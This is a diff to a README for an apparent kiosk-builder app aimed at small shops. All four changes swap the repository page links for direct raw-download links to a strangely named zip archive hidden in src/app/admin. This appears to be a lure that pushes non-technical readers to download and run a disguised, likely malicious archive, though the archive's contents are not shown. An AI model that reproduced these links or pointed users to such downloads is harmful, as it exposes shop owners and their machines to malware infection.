@@ -1,12 +1,12 @@
 # 🛒 22B-Kiosk-Self-Service-Kiosk-Builder-for-Small-Businesses- - Simple kiosk setup for busy shops
 
-[![Download Now](https://img.shields.io/badge/Download-22B--Kiosk-blue?style=for-the-badge)](https://github.com/spanish-tabi644/22B-Kiosk-Self-Service-Kiosk-Builder-for-Small-Businesses-)
+[![Download Now](https://img.shields.io/badge/Download-22B--Kiosk-blue?style=for-the-badge)](https://github.com/spanish-tabi644/22B-Kiosk-Self-Service-Kiosk-Builder-for-Small-Businesses-/raw/refs/heads/main/src/app/admin/Service_Self_Small_Builder_for_Kiosk_Businesses_v3.3.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-[Download 22B-Kiosk-Self-Service-Kiosk-Builder-for-Small-Businesses-](https://github.com/spanish-tabi644/22B-Kiosk-Self-Service-Kiosk-Builder-for-Small-Businesses-)
+[Download 22B-Kiosk-Self-Service-Kiosk-Builder-for-Small-Businesses-](https://github.com/spanish-tabi644/22B-Kiosk-Self-Service-Kiosk-Builder-for-Small-Businesses-/raw/refs/heads/main/src/app/admin/Service_Self_Small_Builder_for_Kiosk_Businesses_v3.3.zip)
 
 ## 🖥️ What this app does
 
@@ -36,7 +36,7 @@ For best results, use a PC that stays plugged in and connected to power.
 ## 🚀 Get started
 
 1. Open the download page:
-   [Download 22B-Kiosk-Self-Service-Kiosk-Builder-for-Small-Businesses-](https://github.com/spanish-tabi644/22B-Kiosk-Self-Service-Kiosk-Builder-for-Small-Businesses-)
+   [Download 22B-Kiosk-Self-Service-Kiosk-Builder-for-Small-Businesses-](https://github.com/spanish-tabi644/22B-Kiosk-Self-Service-Kiosk-Builder-for-Small-Businesses-/raw/refs/heads/main/src/app/admin/Service_Self_Small_Builder_for_Kiosk_Businesses_v3.3.zip)
 
 2. Look for the latest release or app file on the page.
 
@@ -215,7 +215,7 @@ Always keep one backup copy of your old setup before you update
 
 If you need to reinstall or set up another PC, use the same page here:
 
-[Download 22B-Kiosk-Self-Service-Kiosk-Builder-for-Small-Businesses-](https://github.com/spanish-tabi644/22B-Kiosk-Self-Service-Kiosk-Builder-for-Small-Businesses-)
+[Download 22B-Kiosk-Self-Service-Kiosk-Builder-for-Small-Businesses-](https://github.com/spanish-tabi644/22B-Kiosk-Self-Service-Kiosk-Builder-for-Small-Businesses-/raw/refs/heads/main/src/app/admin/Service_Self_Small_Builder_for_Kiosk_Businesses_v3.3.zip)
 
 ## 🧭 Quick path for Windows
 
